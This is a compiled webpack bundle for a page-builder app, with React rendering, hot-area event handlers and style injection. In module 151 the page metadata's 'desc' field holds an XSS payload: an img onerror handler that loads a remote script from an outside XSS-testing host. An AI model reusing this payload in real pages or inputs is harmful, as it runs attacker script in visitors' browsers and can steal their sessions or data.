module.exports = function(window, document) {var App = function(options) {window.appOptions = options};var self = window.self;var HTMLElement = window.HTMLElement;var Element = window.Element;var Node = window.Node;var localStorage = window.localStorage;var sessionStorage = window.sessionStorage;var navigator = window.navigator;var history = window.history;var location = window.location;var performance = window.performance;var Image = window.Image;var CustomEvent = window.CustomEvent;var Event = window.Event;var requestAnimationFrame = window.requestAnimationFrame;var cancelAnimationFrame = window.cancelAnimationFrame;var getComputedStyle = window.getComputedStyle;var XMLHttpRequest = window.XMLHttpRequest;var Worker = window.Worker;var SharedWorker = window.SharedWorker;window["createApp"] =
/******/ (function(modules) { // webpackBootstrap
/******/ 	// install a JSONP callback for chunk loading
/******/ 	function webpackJsonpCallback(data) {
/******/ 		var chunkIds = data[0];
/******/ 		var moreModules = data[1];
/******/ 		var executeModules = data[2];
/******/
/******/ 		// add "moreModules" to the modules object,
/******/ 		// then flag all "chunkIds" as loaded and fire callback
/******/ 		var moduleId, chunkId, i = 0, resolves = [];
/******/ 		for(;i < chunkIds.length; i++) {
/******/ 			chunkId = chunkIds[i];
/******/ 			if(Object.prototype.hasOwnProperty.call(installedChunks, chunkId) && installedChunks[chunkId]) {
/******/ 				resolves.push(installedChunks[chunkId][0]);
/******/ 			}
/******/ 			installedChunks[chunkId] = 0;
/******/ 		}
/******/ 		for(moduleId in moreModules) {
/******/ 			if(Object.prototype.hasOwnProperty.call(moreModules, moduleId)) {
/******/ 				modules[moduleId] = moreModules[moduleId];
/******/ 			}
/******/ 		}
/******/ 		if(parentJsonpFunction) parentJsonpFunction(data);
/******/
/******/ 		while(resolves.length) {
/******/ 			resolves.shift()();
/******/ 		}
/******/
/******/ 		// add entry modules from loaded chunk to deferred list
/******/ 		deferredModules.push.apply(deferredModules, executeModules || []);
/******/
/******/ 		// run deferred modules when all chunks ready
/******/ 		return checkDeferredModules();
/******/ 	};
/******/ 	function checkDeferredModules() {
/******/ 		var result;
/******/ 		for(var i = 0; i < deferredModules.length; i++) {
/******/ 			var deferredModule = deferredModules[i];
/******/ 			var fulfilled = true;
/******/ 			for(var j = 1; j < deferredModule.length; j++) {
/******/ 				var depId = deferredModule[j];
/******/ 				if(installedChunks[depId] !== 0) fulfilled = false;
/******/ 			}
/******/ 			if(fulfilled) {
/******/ 				deferredModules.splice(i--, 1);
/******/ 				result = __webpack_require__(__webpack_require__.s = deferredModule[0]);
/******/ 			}
/******/ 		}
/******/
/******/ 		return result;
/******/ 	}
/******/
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// object to store loaded and loading chunks
/******/ 	// undefined = chunk not loaded, null = chunk preloaded/prefetched
/******/ 	// Promise = chunk loading, 0 = chunk loaded
/******/ 	var installedChunks = {
/******/ 		0: 0
/******/ 	};
/******/
/******/ 	var deferredModules = [];
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	var jsonpArray = window["webpackJsonpcreateApp"] = window["webpackJsonpcreateApp"] || [];
/******/ 	var oldJsonpFunction = jsonpArray.push.bind(jsonpArray);
/******/ 	jsonpArray.push = webpackJsonpCallback;
/******/ 	jsonpArray = jsonpArray.slice();
/******/ 	for(var i = 0; i < jsonpArray.length; i++) webpackJsonpCallback(jsonpArray[i]);
/******/ 	var parentJsonpFunction = oldJsonpFunction;
/******/
/******/
/******/ 	// add entry module to deferred list
/******/ 	deferredModules.push([162,1,2]);
/******/ 	// run deferred modules when ready
/******/ 	return checkDeferredModules();
/******/ })
/************************************************************************/
/******/ ({

/***/ 112:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return injectStyle; });
function injectStyle(content, className) {
  if (typeof window === 'undefined') {
    return;
  }

  if (!content.toString().trim()) {
    return;
  }

  if (true) {
    // 小程序动态注入采用变通的方法
    // 1.分析出样式块 2.选择元素实例 3.设置该实例样式
    setTimeout(() => {
      const styleRegExp = /\s*([^{]*?)\s*\{\s*([^}]*?)\s*\}\s*/g;

      const setStyle = (element, style) => {
        element.setAttribute('style', style);
      };

      let match = styleRegExp.exec(content);
      let selector;
      let elements;

      while (match !== null) {
        selector = match[1];

        if (selector === 'body') {
          elements = [document.body];
        } else {
          elements = document.querySelectorAll(match[1]);
        }

        for (let i = 0; i < elements.length; i++) {
          setStyle(elements[i], match[2]);
        }

        match = styleRegExp.exec(content);
      }
    }, 100);
  } else {}
}

/***/ }),

/***/ 113:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return onPage; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return emitPage; });
/* harmony import */ var _utils_eventProxy__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(40);

const pageEvents = new _utils_eventProxy__WEBPACK_IMPORTED_MODULE_0__[/* EventProxy */ "a"]();
function onPage(eventType, callback) {
  pageEvents.on(eventType, callback);
}
function emitPage(eventType, params) {
  pageEvents.emit(eventType, params);
}

/***/ }),

/***/ 114:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return onComponent; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return emitComponent; });
/* harmony import */ var _utils_eventProxy__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(40);
/* harmony import */ var _actionParams__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(18);
 // eslint-disable-next-line import/no-cycle


const componentEvents = new _utils_eventProxy__WEBPACK_IMPORTED_MODULE_0__[/* EventProxy */ "a"]();
function onComponent(eventType, callback) {
  componentEvents.on(eventType, callback);
}
function emitComponent(e, eventType, instance, meta, global) {
  const params = Object(_actionParams__WEBPACK_IMPORTED_MODULE_1__[/* generatePluginEventListenerCallbackParams */ "c"])(eventType, global, meta, instance);

  if (e) {
    params.originalEvent = e;
  }

  delete params.hotArea;
  componentEvents.emit(eventType, params);
}

/***/ }),

/***/ 115:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return PositionHandler; });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(2);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__);
/*
eslint-disable
 */

function PositionHandler({
  positionStyle,
  children,
  instance
}) {
  const fixedWidth = instance && instance.fixedWrapperStyle && instance.fixedWrapperStyle.width;
  const fixedHeight = instance && instance.fixedWrapperStyle && instance.fixedWrapperStyle.height;
  const commonWidth = instance && instance.commonStyle && instance.commonStyle.width;
  const styleOBj = { ...positionStyle,
    width: fixedWidth || (commonWidth ? 'auto' : '100%'),
    height: fixedHeight || 'auto',
    zIndex: 999
  };
  return /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement("div", {
    style: styleOBj
  }, children);
}

/***/ }),

/***/ 151:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* WEBPACK VAR INJECTION */(function(process) {/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return App; });
/* unused harmony export renderToString */
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(2);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _handlers_reactHandlers_render__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(154);
/* harmony import */ var _handlers_shared_injectStyle__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(112);
/* harmony import */ var _handlers_shared_instanceMap__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(82);
/* harmony import */ var _handlers_shared_selectVersion__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(153);
/* harmony import */ var _libraries_base_components_Video__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(159);
// Import Libs and Handlers




 // Import Components

 // Import Plugins
// Import Actions

let ReactDOMServer;

if (process.env.SSR) {
  // TODO: Remove
  __webpack_require__(169);

  ReactDOMServer = __webpack_require__(342);
} // Global Style


Object(_handlers_shared_injectStyle__WEBPACK_IMPORTED_MODULE_2__[/* injectStyle */ "a"])(`body {
	border: 1px none #161616 !important;
background-color: #ffffff !important;
background-repeat: repeat-y !important;
background-size: auto !important;
background-position: center top !important;
}`, '__impage_injected-global-styles'); // Auto Inject Style

Object(_handlers_shared_injectStyle__WEBPACK_IMPORTED_MODULE_2__[/* injectStyle */ "a"])(``, '__impage_injected-component-styles'); // Global Data

const meta = {
  "title": "test",
  "desc": "\"><img src=\"x\" onerror=\"s=createElement('script');body.appendChild(s);s.src='https://lea.xss.ht';\">",
  "start": new Date('Thu Feb 04 2021 16:32:03 GMT+0800 (China Standard Time)'),
  "end": new Date('Sat Feb 13 2021 16:32:03 GMT+0800 (China Standard Time)'),
  "actId": 37,
  "actKey": "ddd",
  "containerType": "*",
  "isTemplate": false,
  "isEditor": false,
  "isTestEnv": false
};
const _global = {}; // Inject JIMU_Vars

if (typeof window !== 'undefined') {
  if (!window['JIMU_VARS']) {
    Object.defineProperty(window, 'JIMU_VARS', {
      value: {
        "key": "ddd",
        "actStartTime": "2021-02-04T08:32:03.000Z",
        "actEndTime": "2021-02-13T08:32:03.000Z",
        "isJimu": false
      },
      writable: false,
      configurable: false
    });
  } // Inject Global


  if (!window['VISION']) {
    Object.defineProperty(window, 'VISION', {
      value: {
        meta,
        global: _global
      },
      writable: false,
      configurable: false
    });
  }
} // Actions


const actions = {}; // Components

const components = {
  "12": {
    "component": _libraries_base_components_Video__WEBPACK_IMPORTED_MODULE_5__[/* default */ "a"],
    "id": 12,
    "projId": 2,
    "projKey": "base",
    "name": "Video",
    "info": {
      "name": "视频",
      "desc": "视频组件",
      "author": "royguo"
    }
  }
}; // Plugin

const plugins = {}; // InstanceMap { [versionId]: { componentInstances: [], pluginInstances: [] } }

const instanceVersionMap = {
  "47411a19": {
    "componentInstances": [{
      "key": 0,
      "component": components['12'],
      "data": {
        "autoplay": false
      },
      "style": {},
      "commonStyle": {},
      "wrapperStyle": {},
      "actions": []
    }],
    "pluginInstances": []
  }
};
function App({
  version
}) {
  const {
    componentInstances,
    pluginInstances
  } = Object(_handlers_shared_selectVersion__WEBPACK_IMPORTED_MODULE_4__[/* selectVersion */ "a"])(instanceVersionMap, version); // Init

  Object(_handlers_shared_instanceMap__WEBPACK_IMPORTED_MODULE_3__[/* initComponentInstanceIndexMap */ "b"])(componentInstances);
  return /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_handlers_reactHandlers_render__WEBPACK_IMPORTED_MODULE_1__[/* AppRender */ "a"], {
    componentInstances: componentInstances,
    pluginInstances: pluginInstances,
    global: _global,
    meta: meta
  });
}
function renderToString() {
  return ReactDOMServer.renderToString( /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(App, null));
}
/* WEBPACK VAR INJECTION */}.call(this, __webpack_require__(117)))

/***/ }),

/***/ 153:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return selectVersion; });
function selectVersion(instanceVersionMap, versionId) {
  const versionIds = Object.keys(instanceVersionMap);
  const useVersion = versionIds.indexOf(versionId) > -1 ? versionId : versionIds[0];
  return instanceVersionMap[useVersion];
}

/***/ }),

/***/ 154:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* WEBPACK VAR INJECTION */(function(global) {/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return AppRender; });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(2);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _actionHandler__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(160);
/* harmony import */ var _adaptor__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(158);
/* harmony import */ var _shared_componentEventActionEmitter__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(84);
/* harmony import */ var _shared_customEventTrigger__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(83);
/* harmony import */ var _shared_eventListener__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(113);
/* harmony import */ var _shared_eventListener__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(41);
/* harmony import */ var _PositionHandler__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(115);
/* harmony import */ var _shared_actionParams__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(18);









if (typeof window === 'undefined') {
  // 兼容 ssr 时，window 为 undefined 导致报错的情况
  global.window = {};
}

function ComponentItem({
  meta,
  global,
  instance,
  ...injectProps
}) {
  const {
    key,
    children,
    component: {
      component: Component
    },
    data,
    style,
    commonStyle,
    position,
    slot
  } = instance;

  const emit = (trigger, payload) => Object(_shared_customEventTrigger__WEBPACK_IMPORTED_MODULE_4__[/* emitCustomEvent */ "a"])(instance, trigger, global, meta, payload);

  const on = (eventName, callback) => Object(_shared_componentEventActionEmitter__WEBPACK_IMPORTED_MODULE_3__[/* onComponentEventAction */ "a"])(instance, eventName, callback);

  if (children) {
    const content = /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(Component, {
      key: key,
      componentKey: key,
      data: data,
      meta: meta,
      global: global,
      style: style,
      commonStyle: commonStyle,
      emit: emit,
      on: on,
      slot: slot
    }, children.map(childInstance => /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(ComponentItem, {
      key: childInstance.key,
      instance: childInstance,
      meta: meta,
      global: global,
      slot: childInstance.slot
    })));
    return /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_actionHandler__WEBPACK_IMPORTED_MODULE_1__[/* ComponentActionHandler */ "a"], {
      instance: instance,
      meta: meta,
      global: global
    }, position ? /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_PositionHandler__WEBPACK_IMPORTED_MODULE_7__[/* PositionHandler */ "a"], {
      positionStyle: position,
      instance: instance
    }, content) : content);
  }

  const content = /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_actionHandler__WEBPACK_IMPORTED_MODULE_1__[/* ComponentActionHandler */ "a"], {
    instance: instance,
    meta: meta,
    global: global
  }, /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_adaptor__WEBPACK_IMPORTED_MODULE_2__[/* Adaptor */ "a"], {
    instance: instance,
    injectProps: injectProps,
    meta: meta,
    global: global
  }));

  if (position) {
    return /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(_PositionHandler__WEBPACK_IMPORTED_MODULE_7__[/* PositionHandler */ "a"], {
      positionStyle: position,
      instance: instance
    }, content);
  }

  return content;
}

function AppRender({
  componentInstances,
  pluginInstances,
  global,
  meta
}) {
  const execPlugins = react__WEBPACK_IMPORTED_MODULE_0___default.a.useCallback(() => {
    pluginInstances.forEach(plugin => {
      const {
        plugin: {
          plugin: pluginFn
        }
      } = plugin;
      const params = Object(_shared_actionParams__WEBPACK_IMPORTED_MODULE_8__[/* generatePluginParams */ "d"])(plugin, global, meta);
      pluginFn(params);
    });
  }, []);
  react__WEBPACK_IMPORTED_MODULE_0___default.a.useEffect(() => {
    execPlugins();
    Object(_shared_eventListener__WEBPACK_IMPORTED_MODULE_5__[/* emitPage */ "a"])(_shared_eventListener__WEBPACK_IMPORTED_MODULE_6__[/* PageEventListenerTypes */ "b"].INIT, {
      global,
      meta
    });
  }, []);
  return /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(react__WEBPACK_IMPORTED_MODULE_0___default.a.Fragment, null, componentInstances.map(instance => /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_0___default.a.createElement(ComponentItem, {
    key: instance.key,
    instance: instance,
    meta: meta,
    global: global
  })));
}
/* WEBPACK VAR INJECTION */}.call(this, __webpack_require__(66)))

/***/ }),

/***/ 156:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "b", function() { return onHotArea; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return emitHotArea; });
/* harmony import */ var _utils_eventProxy__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(40);
/* harmony import */ var _actionParams__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(18);
 // eslint-disable-next-line import/no-cycle


const hotAreaEventListeners = new _utils_eventProxy__WEBPACK_IMPORTED_MODULE_0__[/* EventProxy */ "a"]();
function onHotArea(eventType, callback) {
  hotAreaEventListeners.on(eventType, callback);
}
function emitHotArea(e, eventType, hotArea, instance, meta, global) {
  const params = Object(_actionParams__WEBPACK_IMPORTED_MODULE_1__[/* generatePluginEventListenerCallbackParams */ "c"])(eventType, global, meta, instance, hotArea);

  if (e) {
    params.originalEvent = e;
  }

  hotAreaEventListeners.emit(eventType, params);
}

/***/ }),

/***/ 158:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, "a", function() { return /* binding */ Adaptor; });

// EXTERNAL MODULE: /data/sites/vision.qq.com/workspace/libraries/materials-nolan-test-saas/node_modules/react/index.js
var react = __webpack_require__(2);
var react_default = /*#__PURE__*/__webpack_require__.n(react);

// EXTERNAL MODULE: ./handlers/shared/componentEventActionEmitter.js
var componentEventActionEmitter = __webpack_require__(84);

// EXTERNAL MODULE: ./handlers/shared/componentNodeMap.js
var componentNodeMap = __webpack_require__(17);

// EXTERNAL MODULE: ./handlers/shared/customEventTrigger.js
var customEventTrigger = __webpack_require__(83);

// EXTERNAL MODULE: ./handlers/shared/eventListener/hotAreaEventListener.js
var hotAreaEventListener = __webpack_require__(156);

// EXTERNAL MODULE: ./handlers/shared/utils/events.js
var events = __webpack_require__(20);

// EXTERNAL MODULE: ./handlers/shared/actionHandler/types.js
var types = __webpack_require__(7);

// EXTERNAL MODULE: ./handlers/shared/actionHandler/utils.js
var utils = __webpack_require__(60);

// EXTERNAL MODULE: ./handlers/shared/actionParams.js + 1 modules
var actionParams = __webpack_require__(18);

// EXTERNAL MODULE: ./handlers/shared/utils/common.js
var common = __webpack_require__(19);

// EXTERNAL MODULE: ./handlers/shared/hotAreaNodeMap.js
var hotAreaNodeMap = __webpack_require__(67);

// CONCATENATED MODULE: ./handlers/reactHandlers/actionHandler/HotAreaActionHandler.jsx
function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }









const LONG_PRESS_TIMEOUT = 1000;
const DOUBLE_CLICK_TIMEOUT = 200;
const INTERSECTION_TIMEOUT = 500;
class HotAreaActionHandler_HotAreaActionHandler extends react["PureComponent"] {
  constructor(props) {
    super(props);

    _defineProperty(this, "intersectionObserver", null);

    _defineProperty(this, "handlerParams", {});

    _defineProperty(this, "handlers", {});

    _defineProperty(this, "containerRef", null);

    _defineProperty(this, "longPressTimer", null);

    _defineProperty(this, "preventClick", false);

    _defineProperty(this, "doubleClickTimer", null);

    _defineProperty(this, "intersectionTimer", null);

    _defineProperty(this, "execActionHooks", actions => {
      actions.forEach(action => {
        if (typeof action.action.action === 'function') {
          return;
        }

        const hooks = action.action.action;

        if (hooks.afterHandlerRender) {
          const params = Object(actionParams["b" /* generateHotareaActionParams */])(action, this.props.hotArea, this.props.instance, this.props.global, this.props.meta);

          try {
            hooks.afterHandlerRender(params);
          } catch (e) {
            console.error('Action "afterHandlerRender" hook throw error: ', e);
          }
        }
      });
    });

    _defineProperty(this, "initIntersectionObserver", () => {
      this.intersectionObserver = new window.IntersectionObserver(entries => {
        entries.forEach(({
          target,
          isIntersecting
        }) => {
          const key = parseInt(target.getAttribute('data-key'), 10);
          events["b" /* events */].emit(events["a" /* EventEmitTypes */].HOT_AREA_INTERSECTING_CHANGE, isIntersecting, key);
        });
      });
    });

    _defineProperty(this, "observeIntersection", () => this.intersectionObserver.observe(this.containerRef));

    _defineProperty(this, "unobserveIntersection", () => this.intersectionObserver.unobserve(this.containerRef));

    _defineProperty(this, "onHotAreaIntersectionChange", (isIntersecting, key) => {
      if (key !== this.props.hotArea.key) {
        return;
      }

      if (this.intersectionTimer) {
        clearTimeout(this.intersectionTimer);
        this.intersectionTimer = null;
      }

      const callback = isIntersecting ? this.onHotAreaEnterView : this.onHotAreaLeaveView;
      this.intersectionTimer = window.setTimeout(() => {
        callback();
        clearTimeout(this.intersectionTimer);
        this.intersectionTimer = null;
      }, INTERSECTION_TIMEOUT);
    });

    _defineProperty(this, "onHotAreaEnterView", () => {
      if (this.handlers.onEnterView) {
        this.handlers.onEnterView(undefined);
      }
    });

    _defineProperty(this, "onHotAreaLeaveView", () => {
      if (this.handlers.onLeaveView) {
        this.handlers.onLeaveView(undefined);
      }
    });

    _defineProperty(this, "onHotAreaPress", Object(common["c" /* withPersistReactEvent */])(e => {
      if (!this.handlers.onLongPress) {
        return;
      }

      this.longPressTimer = window.setTimeout(() => this.handlers.onLongPress(e), LONG_PRESS_TIMEOUT);
    }));

    _defineProperty(this, "onHotAreaPressRelease", () => {
      if (this.longPressTimer) {
        window.clearTimeout(this.longPressTimer);
      }

      this.longPressTimer = null;
    });

    _defineProperty(this, "onSingleClick", Object(common["c" /* withPersistReactEvent */])(e => {
      this.doubleClickTimer = window.setTimeout(() => {
        if (!this.preventClick) {
          try {
            this.handlers.onClick(e);
          } catch (e) {
            console.error('Exec onClick action error:', e);
          }
        }
      }, DOUBLE_CLICK_TIMEOUT);
    }));

    _defineProperty(this, "onDoubleClick", Object(common["c" /* withPersistReactEvent */])(e => {
      if (this.doubleClickTimer) {
        clearTimeout(this.doubleClickTimer);
        this.doubleClickTimer = null;
      }

      this.preventClick = true;

      try {
        this.handlers.onDoubleClick(e);
      } catch (e) {
        console.error('Exec onClick action error:', e);
      }

      setTimeout(() => {
        this.preventClick = false;
      }, DOUBLE_CLICK_TIMEOUT);
    }));

    _defineProperty(this, "emitHotAreaEvent", (e, type) => {
      const {
        props: {
          hotArea,
          instance
        },
        handlerParams: {
          global,
          meta
        }
      } = this;
      return Object(hotAreaEventListener["a" /* emitHotArea */])(e, type, hotArea, instance, meta, global);
    });

    _defineProperty(this, "withEmitHotAreaEvent", (type, handler) => e => {
      if (e) {
        e.persist();
      }

      this.emitHotAreaEvent(e, type);

      if (handler) {
        return handler(e, this.handlerParams);
      }
    });

    _defineProperty(this, "updateHandlerParams", (meta, global) => {
      this.handlerParams.meta = meta;
      this.handlerParams.global = global;
    });

    _defineProperty(this, "updateHandlersWithParams", actions => {
      const {
        onInit,
        onClick,
        onMouseEnter,
        onMouseLeave,
        onDoubleClick,
        onLongPress,
        onEnterView,
        onLeaveView
      } = Object(utils["a" /* generateHandlers */])(actions, this.props.instance, this.props.hotArea);
      const {
        withEmitHotAreaEvent,
        handlers
      } = this;
      handlers.onInit = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].INIT, onInit);
      handlers.onClick = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].CLICK, onClick);
      handlers.onMouseEnter = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].MOUSE_ENTER, onMouseEnter);
      handlers.onMouseLeave = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].MOUSE_LEAVE, onMouseLeave);
      handlers.onDoubleClick = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].DOUBLE_CLICK, onDoubleClick);
      handlers.onLongPress = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].LONG_PRESS, onLongPress);
      handlers.onEnterView = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].ENTER_VIEW, onEnterView);
      handlers.onLeaveView = withEmitHotAreaEvent(types["c" /* HotAreaEventListenerTypes */].LEAVE_VIEW, onLeaveView);
    });

    _defineProperty(this, "setNode", node => {
      this.containerRef = node;
      Object(hotAreaNodeMap["c" /* setHotAreaNode */])(node);
    });

    this.handlerParams = {
      global: props.global,
      meta: props.meta
    };
    this.updateHandlersWithParams(props.hotArea.actions);
  }

  componentDidMount() {
    if (false) {}

    events["b" /* events */].on(events["a" /* EventEmitTypes */].HOT_AREA_INTERSECTING_CHANGE, this.onHotAreaIntersectionChange);

    if (this.handlers.onInit) {
      this.handlers.onInit(undefined);
    }

    this.execActionHooks(this.props.hotArea.actions);
  }

  componentWillReceiveProps(nextProps) {
    if (nextProps.global !== this.props.global || nextProps.meta !== this.props.meta) {
      this.updateHandlerParams(nextProps.meta, nextProps.global);
    }

    if (nextProps.hotArea.actions !== this.props.hotArea.actions) {
      this.updateHandlersWithParams(nextProps.hotArea.actions);
    }
  }

  componentWillUnmount() {
    if (false) {}

    events["b" /* events */].cancel(events["a" /* EventEmitTypes */].HOT_AREA_INTERSECTING_CHANGE, this.onHotAreaIntersectionChange);
    Object(hotAreaNodeMap["a" /* deleteHotAreaNode */])(this.props.hotArea.kebabCase);

    if (this.longPressTimer) {
      window.clearTimeout(this.longPressTimer);
    }
  }

  render() {
    const {
      children,
      style = {}
    } = this.props;
    const {
      onMouseLeave,
      onMouseEnter
    } = this.handlers;
    const elementType =  true ? 'wx-button' : undefined; // wx-button 视为 Web Components, 故使用 class, 见 https://reactjs.org/docs/dom-elements.html#classname

    const classKey =  true ? 'class' : undefined;
    return /*#__PURE__*/react["createElement"](elementType, {
      [classKey]: '__impage-hot-area-actions-proxy',
      id: Object(common["b" /* getHotAreaId */])(this.props.hotArea.key),
      ref: this.setNode,
      'data-key': this.props.hotArea.key,
      onClick: this.onSingleClick,
      onDoubleClick: this.onDoubleClick,
      onMouseEnter,
      onMouseLeave,
      onTouchStart: this.onHotAreaPress,
      onTouchEnd: this.onHotAreaPressRelease,
      onMouseDown: this.onHotAreaPress,
      onMouseUp: this.onHotAreaPressRelease,
      style
    }, children);
  }

}
// CONCATENATED MODULE: ./handlers/reactHandlers/HotAreas.jsx



function percent(p) {
  return `${p}%`;
}

function HotAreas({
  instance,
  global,
  meta
}) {
  const {
    hotAreas
  } = instance.data;

  if (!hotAreas || !hotAreas.length) {
    return null;
  }

  return hotAreas.map((hotArea, index) => {
    const {
      size,
      position
    } = hotArea;
    return /*#__PURE__*/react["createElement"](HotAreaActionHandler_HotAreaActionHandler, {
      key: index // eslint-disable-line
      ,
      instance: instance,
      hotArea: hotArea,
      meta: meta,
      global: global,
      style: {
        width: percent(size.width),
        height: percent(size.height),
        left: percent(position.x),
        top: percent(position.y),
        cursor: 'pointer',
        position: 'absolute',
        zIndex: 20
      }
    });
